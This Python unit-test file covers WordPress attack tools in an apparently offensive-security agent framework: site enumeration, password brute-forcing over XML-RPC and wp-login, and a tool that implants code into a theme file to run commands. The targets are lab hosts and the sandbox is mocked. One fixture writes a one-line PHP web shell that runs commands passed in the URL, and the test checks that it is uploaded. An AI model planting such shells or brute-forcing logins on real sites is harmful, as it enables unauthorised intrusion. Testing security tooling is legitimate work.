"""Unit tests for the WordPress tools (sandbox mocked, no network).

Three layers are exercised:

* the pure parsers (``nexus_core.tools.parsers.wordpress``);
* the *injected* sandbox source (``._wp.XMLRPC_SOURCE``), which is ``exec``-ed so
  the XML builder/parser is tested exactly as it runs inside the sandbox;
* the handlers, with a fake sandbox, including the post-conditions that decide
  whether a run counts as verified.
"""

from __future__ import annotations

import asyncio
import base64
import contextlib
import json
from pathlib import Path
from unittest import mock

import pytest

from nexus_core.kernel.models import Identity, RiskLevel, RunContext
from nexus_core.kernel.sandbox import SandboxResult
from nexus_core.tools.handlers import wp as wp_module
from nexus_core.tools.handlers._wp import (
    WP_BRUTEFORCE_CLIENT_SCRIPT,
    WP_EXEC_CLIENT_SCRIPT,
    XMLRPC_SOURCE,
)
from nexus_core.tools.handlers.wp import (
    WP_ALLOWED_PROGRAMS,
    WP_ENUM_PROBES,
    wp_bruteforce_definition,
    wp_bruteforce_handler,
    wp_enum_definition,
    wp_enum_handler,
    wp_exec_definition,
    wp_exec_handler,
)
from nexus_core.tools.parsers.wordpress import (
    extract_assets,
    extract_nonce,
    extract_rest_users,
    extract_site_title,
    extract_textarea,
    extract_version,
    normalize_site_url,
)

pytestmark = pytest.mark.unit


# --------------------------------------------------------------------------- #
# Pure parsers
# --------------------------------------------------------------------------- #


def test_normalize_site_url_adds_scheme_and_strips_slash():
    assert normalize_site_url("internal.thm/blog/") == "http://internal.thm/blog"
    assert normalize_site_url("https://internal.thm/blog") == "https://internal.thm/blog"


@pytest.mark.parametrize("value", ["", "ftp://internal.thm", "http://"])
def test_normalize_site_url_rejects_bad_values(value):
    with pytest.raises(ValueError):
        normalize_site_url(value)


def test_extract_version_prefers_the_generator_meta():
    front = '<meta name="generator" content="WordPress 5.4.2" />'
    assert extract_version(front, "Version 6.0") == ("5.4.2", "meta_generator")


def test_extract_version_falls_back_to_readme():
    assert extract_version("", "<h1>Version 4.9.8</h1>") == ("4.9.8", "readme_html")
    assert extract_version("", "") == (None, None)


def test_extract_assets_dedupes_themes_and_plugins():
    html = (
        '<link href="/blog/wp-content/themes/twentyseventeen/style.css">'
        '<script src="/blog/wp-content/plugins/akismet/x.js"></script>'
        '<img src="/blog/wp-content/themes/twentyseventeen/header.jpg">'
    )
    assets = extract_assets(html)
    assert assets["themes"] == ["twentyseventeen"]
    assert assets["plugins"] == ["akismet"]


def test_extract_rest_users_reads_slugs():
    payload = json.dumps([{"id": 1, "name": "admin", "slug": "admin", "link": "http://x/"}])
    assert extract_rest_users(payload)[0]["slug"] == "admin"


@pytest.mark.parametrize("payload", ["<html>404</html>", "{}", "not json"])
def test_extract_rest_users_rejects_non_arrays(payload):
    with pytest.raises(ValueError):
        extract_rest_users(payload)


def test_extract_site_title_strips_the_page_prefix():
    assert extract_site_title("<title>Page not found &#8211; Internal</title>") == "Internal"


def test_extract_nonce_tolerates_attribute_order():
    assert extract_nonce('<input type="hidden" name="_wpnonce" value="abc123" />') == "abc123"
    assert extract_nonce('<input value="def456" name="_wpnonce">') == "def456"
    assert extract_nonce("<html></html>") is None


def test_extract_textarea_decodes_entities():
    document = '<textarea name="newcontent"><?php echo &quot;x&quot;; ?&gt;&#039;</textarea>'
    assert extract_textarea(document, "newcontent") == "<?php echo \"x\"; ?>\'"
    assert extract_textarea(document, "missing") is None


# --------------------------------------------------------------------------- #
# Injected sandbox source
# --------------------------------------------------------------------------- #


def _xmlrpc_namespace() -> dict:
    namespace: dict = {}
    exec(compile(XMLRPC_SOURCE, "<xmlrpc_source>", "exec"), namespace)  # noqa: S102
    return namespace


def test_injected_source_is_valid_python():
    namespace = _xmlrpc_namespace()
    assert callable(namespace["xmlrpc_login_body"])
    assert callable(namespace["parse_call_outcome"])
    assert callable(namespace["xmlrpc_preflight"])
    assert callable(namespace["xmlrpc_batching_probe"])


def test_login_body_escapes_and_sanitizes_the_credential():
    namespace = _xmlrpc_namespace()
    body = namespace["xmlrpc_login_body"]("ad&min", 'a<b"c')
    text = body.decode("utf-8")
    assert "ad&amp;min" in text
    assert "a&lt;b&quot;c" in text
    # Exactly one method call: batching was withdrawn (see ``._wp``).
    assert "system.multicall" not in text
    assert text.count("<methodCall>") == 1
    # Control bytes from rockyou are dropped instead of breaking the XML.
    assert "u\x08ritain" not in namespace["xml_sanitize"]("u\x08ritain")
    assert namespace["xml_sanitize"]("u\x08ritain") == "uritain"


def _call_response(faulted: bool) -> str:
    if faulted:
        return (
            '<?xml version="1.0"?><methodResponse><fault><value><struct>'
            "<member><name>faultCode</name><value><int>403</int></value></member>"
            "<member><name>faultString</name><value><string>Incorrect username or "
            "password.</string></value></member></struct></value></fault></methodResponse>"
        )
    return (
        '<?xml version="1.0"?><methodResponse><params><param><value><array><data>'
        "<value><struct><member><name>blogid</name><value><string>1</string></value>"
        "</member></struct></value></data></array></value></param></params></methodResponse>"
    )


def test_parse_call_outcome_distinguishes_success_and_fault():
    namespace = _xmlrpc_namespace()
    assert namespace["parse_call_outcome"](_call_response(False))["faulted"] is False
    faulted = namespace["parse_call_outcome"](_call_response(True))
    assert faulted["faulted"] is True
    assert "Incorrect username" in faulted["fault"]


def test_parse_call_outcome_rejects_garbage():
    namespace = _xmlrpc_namespace()
    with pytest.raises(ValueError):
        namespace["parse_call_outcome"]("<html>404</html>")


def test_parse_multicall_results_reads_the_probe_shape():
    namespace = _xmlrpc_namespace()
    payload = (
        '<?xml version="1.0"?><methodResponse><params><param><value><array><data>'
        "<value><struct><member><name>faultCode</name><value><int>403</int></value></member>"
        "<member><name>faultString</name><value><string>x</string></value></member></struct></value>"
        "<value><struct><member><name>faultCode</name><value><int>403</int></value></member></struct></value>"
        "</data></array></value></param></params></methodResponse>"
    )
    assert namespace["parse_multicall_results"](payload) == [True, True]


def test_client_scripts_embed_the_shared_source():
    for script in (WP_BRUTEFORCE_CLIENT_SCRIPT, WP_EXEC_CLIENT_SCRIPT):
        assert "parse_call_outcome" in script
        assert "__XMLRPC__" not in script
        # A raw embedded script must still compile.
        compile(script, "<client>", "exec")


def test_bruteforce_client_sends_one_credential_per_request():
    # Regression guard for the withdrawn multicall optimisation: the *driver* must
    # never batch, because WordPress poisons the whole batch after the first
    # rejection and the sweep would report 1499/1500 false negatives. The shared
    # source still defines the multicall builder — the preflight probe uses it to
    # record the target's behaviour — so only the driver text is inspected.
    driver = WP_BRUTEFORCE_CLIENT_SCRIPT.replace(XMLRPC_SOURCE, "")
    assert "xmlrpc_try(" in driver
    assert "xmlrpc_multicall_body" not in driver
    assert "parse_multicall_results" not in driver
    # A preflight gates the sweep, and the batching property is measured once a
    # credential is known (it is unmeasurable before that).
    assert "xmlrpc_preflight(" in driver
    assert "xmlrpc_batching_probe(" in driver


# --------------------------------------------------------------------------- #
# Handler plumbing
# --------------------------------------------------------------------------- #


class FakeSandbox:
    def __init__(self, result: SandboxResult, on_run=None):
        self.result = result
        self.on_run = on_run
        self.calls: list[tuple[list[str], float]] = []

    async def run(self, argv, *, timeout_seconds: float = 30):
        self.calls.append((list(argv), timeout_seconds))
        if self.on_run is not None:
            self.on_run(list(argv))
        return self.result


@contextlib.contextmanager
def _fake_sandbox(result: SandboxResult, on_run=None):
    sandbox = FakeSandbox(result, on_run=on_run)
    allowlists: list[tuple[str, ...]] = []

    def factory(workspace_root, allowed_programs=None):
        allowlists.append(tuple(allowed_programs or ()))
        return sandbox

    with mock.patch.object(wp_module, "sandbox_for_environment", factory):
        yield sandbox, allowlists


def _context(run_id: str = "run1") -> RunContext:
    return RunContext("system", Identity("op", "system", roles=("operator",)), run_id=run_id)


def _run(handler, arguments: dict):
    return asyncio.run(handler(arguments, _context()))


def _ok(stdout: str) -> SandboxResult:
    return SandboxResult(exit_code=0, stdout=stdout, stderr="")


@pytest.fixture
def workspace(tmp_path, monkeypatch):
    monkeypatch.setenv("NEXUS_WORKSPACE_ROOT", str(tmp_path))
    return tmp_path


PROBE_PAYLOAD = {
    "probes": [
        {
            "name": "front_page",
            "path": "/",
            "status": 200,
            "length": 10,
            "sha256": "aa",
            "body": '<meta name="generator" content="WordPress 5.4.2" />'
            '<link href="/blog/wp-content/themes/twentyseventeen/style.css">',
        },
        {"name": "readme", "path": "/readme.html", "status": 200, "length": 5, "sha256": "bb", "body": ""},
        {"name": "rest_users", "path": "/wp-json/wp/v2/users", "status": 404, "length": 1, "sha256": "cc", "body": ""},
        {
            "name": "rest_users_query",
            "path": "/?rest_route=/wp/v2/users",
            "status": 200,
            "length": 10,
            "sha256": "dd",
            "body": json.dumps([{"id": 1, "name": "admin", "slug": "admin", "link": "http://x/"}]),
        },
        {"name": "xmlrpc", "path": "/xmlrpc.php", "status": 405, "length": 42, "sha256": "ee",
         "body": "XML-RPC server accepts POST requests only."},
        {"name": "login", "path": "/wp-login.php", "status": 200, "length": 10, "sha256": "ff", "body": ""},
        {"name": "install", "path": "/wp-admin/install.php", "status": 200, "length": 10, "sha256": "11",
         "body": "Already Installed You appear to have already installed WordPress."},
        {"name": "uploads", "path": "/wp-content/uploads/", "status": 404, "length": 1, "sha256": "22", "body": ""},
        {"name": "includes", "path": "/wp-includes/", "status": 403, "length": 1, "sha256": "33", "body": ""},
        {"name": "license", "path": "/license.txt", "status": 200, "length": 1, "sha256": "44", "body": ""},
    ],
    "authors": [
        {"id": 1, "status": 200, "final_url": "http://x/?author=1", "slug": None, "error": None},
        {"id": 2, "status": 200, "final_url": "http://x/author/aubreanna/", "slug": "aubreanna", "error": None},
    ],
}


def test_wp_enum_definition_is_read_only_and_scoped():
    definition = wp_enum_definition("system")
    assert definition.risk is RiskLevel.LOW
    assert definition.scope_required is True
    assert definition.scope_target_field == "url"
    assert "wp_enum" in definition.tool_id


def test_wp_enum_reports_version_users_and_interesting_findings(workspace):
    with _fake_sandbox(_ok(json.dumps(PROBE_PAYLOAD))) as (sandbox, allowlists):
        result = _run(wp_enum_handler, {"url": "http://internal.thm/blog", "max_users": 2})

    assert result.verified is True
    assert result.verification_method == "wp_enum_completed"
    findings = result.output["findings"]
    assert findings["version"] == "5.4.2"
    assert findings["themes"] == ["twentyseventeen"]
    assert [user["slug"] for user in findings["users"]] == ["admin", "aubreanna"]
    ids = {entry["id"] for entry in findings["interesting"]}
    assert {"wp_rest_users_exposed", "wp_xmlrpc_enabled", "wp_version_disclosed"} <= ids
    # ``install.php`` answers 200 with "Already Installed": that is not a finding.
    assert "wp_install_php_reachable" not in ids
    assert allowlists == [WP_ALLOWED_PROGRAMS]
    argv = sandbox.calls[0][0]
    assert argv[0] == "python3"
    assert argv[3] == "http://internal.thm/blog"


def test_wp_enum_probes_are_a_closed_list():
    paths = {path for _name, path in WP_ENUM_PROBES}
    assert "/xmlrpc.php" in paths
    assert "/wp-login.php" in paths
    assert all(path.startswith("/") for path in paths)


def test_wp_enum_without_output_is_not_verified(workspace):
    with _fake_sandbox(_ok("noise")):
        result = _run(wp_enum_handler, {"url": "http://internal.thm/blog"})
    assert result.verified is False
    assert result.verification_method == "wp_enum_no_output"


def test_wp_enum_flags_a_real_installer(workspace):
    payload = json.loads(json.dumps(PROBE_PAYLOAD))
    payload["probes"][6]["body"] = '<form id="setup" method="post">Setup Configuration File</form>'
    with _fake_sandbox(_ok(json.dumps(payload))):
        result = _run(wp_enum_handler, {"url": "http://internal.thm/blog", "max_users": 1})
    ids = {entry["id"] for entry in result.output["findings"]["interesting"]}
    assert "wp_install_php_reachable" in ids


def test_wp_bruteforce_slices_the_wordlist_with_the_offset(workspace):
    wordlist = workspace / "words.txt"
    wordlist.write_text("a\nb\nc\nd\n", encoding="utf-8")
    payload = {
        "ok": True, "transport": "xmlrpc", "username": "admin", "tested": 2, "total": 2,
        "password": None, "verification": {"ok": False, "xmlrpc": False, "wp_login": False},
        "elapsed_seconds": 1.0, "rate_per_second": 2.0, "errors": [],
    }
    with _fake_sandbox(_ok(json.dumps(payload))) as (sandbox, _allowlists):
        result = _run(
            wp_bruteforce_handler,
            {
                "url": "http://internal.thm/blog",
                "username": "admin",
                "password_file": "words.txt",
                "offset": 1,
                "max_attempts": 2,
            },
        )

    sliced = (workspace / "wpbrute_run1" / "wordlist.txt").read_text(encoding="utf-8")
    assert sliced == "b\nc\n"
    assert result.verified is False
    assert result.output["valid_credentials"] == []
    # An exhausted sweep is a determinate negative, not an exception (V0-22).
    assert result.outcome == "negative"
    argv = sandbox.calls[0][0]
    assert argv[:3] == ["python3", "-c", wp_module.WP_BRUTEFORCE_CLIENT_SCRIPT]
    assert argv[3] == "xmlrpc"
    assert argv[4] == "http://internal.thm/blog"
    assert argv[7] == "1"  # offset
    assert argv[8] == "2"  # sliced attempts


def test_wp_bruteforce_verifies_a_recovered_credential(workspace):
    (workspace / "words.txt").write_text("wrong\nright\n", encoding="utf-8")
    payload = {
        "ok": True, "transport": "xmlrpc", "username": "admin", "tested": 2, "total": 2,
        "password": "right",
        "verification": {"ok": True, "xmlrpc": True, "wp_login": True},
        "elapsed_seconds": 0.5, "rate_per_second": 4.0, "errors": [],
    }
    with _fake_sandbox(_ok(json.dumps(payload))):
        result = _run(
            wp_bruteforce_handler,
            {"url": "http://internal.thm/blog", "username": "admin", "password_file": "words.txt"},
        )

    assert result.verified is True
    assert result.verification_method == "wp_credential_validated"
    assert result.output["valid_credentials"] == [
        {"username": "admin", "password": "right", "transport": "xmlrpc"}
    ]


def test_wp_bruteforce_does_not_verify_an_unconfirmed_password(workspace):
    (workspace / "words.txt").write_text("maybe\n", encoding="utf-8")
    payload = {
        "ok": True, "transport": "xmlrpc", "username": "admin", "tested": 1, "total": 1,
        "password": "maybe", "verification": {"ok": False, "xmlrpc": False, "wp_login": False},
        "elapsed_seconds": 0.5, "rate_per_second": 2.0, "errors": [],
    }
    with _fake_sandbox(_ok(json.dumps(payload))):
        result = _run(
            wp_bruteforce_handler,
            {"url": "http://internal.thm/blog", "username": "admin", "password_file": "words.txt"},
        )
    assert result.verified is False
    assert result.output["valid_credentials"] == []


def test_wp_bruteforce_salvages_the_checkpoint_when_killed(workspace):
    (workspace / "words.txt").write_text("a\nb\nc\nd\n", encoding="utf-8")

    def write_checkpoint(argv):
        # The client appends a progress line every 5 s; simulate the last one
        # before the run is killed. argv[11] is the progress path, argv[12] the
        # result path.
        Path(argv[11]).write_text(
            '{"tested": 1000, "total": 1000000, "elapsed_seconds": 5.0}\n', encoding="utf-8"
        )

    with _fake_sandbox(
        SandboxResult(exit_code=None, stdout="", stderr="", timed_out=True), on_run=write_checkpoint
    ):
        result = _run(
            wp_bruteforce_handler,
            {
                "url": "http://internal.thm/blog",
                "username": "admin",
                "password_file": "words.txt",
                "offset": 0,
            },
        )
    assert result.verified is False
    assert result.verification_method == "wp_bruteforce_incomplete"
    assert result.output["checkpoint"]["tested"] == 1000
    assert result.output["resume_offset"] == 1000


def test_wp_bruteforce_rejects_unknown_transport(workspace):
    (workspace / "words.txt").write_text("a\n", encoding="utf-8")
    with pytest.raises(ValueError, match="transport"):
        _run(
            wp_bruteforce_handler,
            {
                "url": "http://internal.thm/blog",
                "username": "admin",
                "password_file": "words.txt",
                "transport": "ssh",
            },
        )


def test_wp_bruteforce_definition_is_high_risk_and_has_no_batch_knob():
    definition = wp_bruteforce_definition("system")
    assert definition.risk is RiskLevel.HIGH
    props = definition.input_schema["properties"]
    assert props["workers"]["maximum"] == 40
    # Batching was withdrawn: exposing it again would re-open the false-negative
    # bug documented in ``._wp``.
    assert "batch_size" not in props
    assert wp_module.WP_BRUTEFORCE_DEFAULT_ATTEMPTS == 5_000


def test_wp_bruteforce_evidence_records_the_evaluated_transport(workspace):
    (workspace / "words.txt").write_text("wrong\n", encoding="utf-8")
    payload = {
        "ok": True, "transport": "xmlrpc", "username": "admin", "tested": 1, "total": 1,
        "password": None, "verification": {"ok": False},
        "preflight": {"ok": True, "reachable": True, "auth_path_active": True},
        "batching": {"applicable": True, "batching_unsound": True, "observed": "FF",
                     "control": "S"},
        "elapsed_seconds": 2.0, "rate_per_second": 0.5, "errors": [],
    }
    with _fake_sandbox(_ok(json.dumps(payload))):
        result = _run(
            wp_bruteforce_handler,
            {"url": "http://internal.thm/blog", "username": "admin", "password_file": "words.txt"},
        )
    assert result.evidence["preflight"]["auth_path_active"] is True
    assert result.evidence["batching_unsound"] is True
    assert result.evidence["batching_observed"] == "FF"
    assert result.output["batching_unsound"] is True


def test_wp_bruteforce_caps_wp_login_workers(workspace):
    (workspace / "words.txt").write_text("wrong\n", encoding="utf-8")
    payload = {
        "ok": True, "transport": "wp-login", "username": "admin", "tested": 1, "total": 1,
        "password": None, "verification": {"ok": False}, "preflight": {},
        "elapsed_seconds": 1.0, "rate_per_second": 1.0, "errors": [],
    }
    with _fake_sandbox(_ok(json.dumps(payload))) as (sandbox, _allowlists):
        _run(
            wp_bruteforce_handler,
            {
                "url": "http://internal.thm/blog",
                "username": "admin",
                "password_file": "words.txt",
                "transport": "wp-login",
                "workers": 40,
            },
        )
    assert sandbox.calls[0][0][9] == str(wp_module.WP_BRUTEFORCE_MAX_WP_LOGIN_WORKERS)


def test_wp_exec_requires_a_valid_theme_file():
    definition = wp_exec_definition("system")
    assert definition.risk is RiskLevel.HIGH

    async def call(arguments):
        with _fake_sandbox(_ok("{}")):
            return await wp_exec_handler(arguments, _context())

    with pytest.raises(ValueError, match="file"):
        asyncio.run(call({"url": "http://x", "username": "u", "password": "p", "file": "../x.php"}))
    with pytest.raises(ValueError, match="theme"):
        asyncio.run(call({"url": "http://x", "username": "u", "password": "p", "theme": "../etc"}))


def test_wp_exec_rejects_too_many_commands():
    arguments = {
        "url": "http://x", "username": "u", "password": "p",
        "commands": ["id"] * (wp_module.WP_EXEC_MAX_COMMANDS + 1),
    }
    with _fake_sandbox(_ok("{}")), pytest.raises(ValueError, match="too many commands"):
        asyncio.run(wp_exec_handler(arguments, _context()))


def test_wp_exec_is_verified_only_when_every_command_produced_output(workspace):
    payload = {
        "ok": True, "authenticated": True, "implanted": True, "restored": True,
        "theme": "twentyseventeen", "file": "404.php",
        "shell_url": "http://x/blog/wp-content/themes/twentyseventeen/404.php",
        "outputs": [{"command": "id", "stdout": "uid=33(www-data)"}],
    }
    with _fake_sandbox(_ok(json.dumps(payload))):
        result = _run(
            wp_exec_handler,
            {"url": "http://x/blog", "username": "admin", "password": "pw", "commands": ["id"]},
        )
    assert result.verified is True
    assert result.verification_method == "wp_command_executed"
    assert result.output["restored"] is True

    payload["outputs"] = [{"command": "id", "stdout": ""}]
    with _fake_sandbox(_ok(json.dumps(payload))):
        result = _run(
            wp_exec_handler,
            {"url": "http://x/blog", "username": "admin", "password": "pw", "commands": ["id"]},
        )
    assert result.verified is False


def test_wp_exec_uploads_a_workspace_payload(workspace):
    payload = workspace / "shell.php"
    payload.write_text("<?php system($_GET['c']); ?>", encoding="utf-8")
    client = {
        "ok": True, "authenticated": True, "implanted": True, "restored": False,
        "outputs": [{"command": "id", "stdout": "uid=33(www-data)"}],
    }
    with _fake_sandbox(_ok(json.dumps(client))) as (sandbox, _allowlists):
        result = _run(
            wp_exec_handler,
            {
                "url": "http://x/blog",
                "username": "admin",
                "password": "pw",
                "payload_file": "shell.php",
                "restore": False,
            },
        )
    argv = sandbox.calls[0][0]
    assert base64.b64decode(argv[9]).decode() == "<?php system($_GET['c']); ?>"
    assert argv[10] == "0"  # restore disabled
    assert result.verified is True
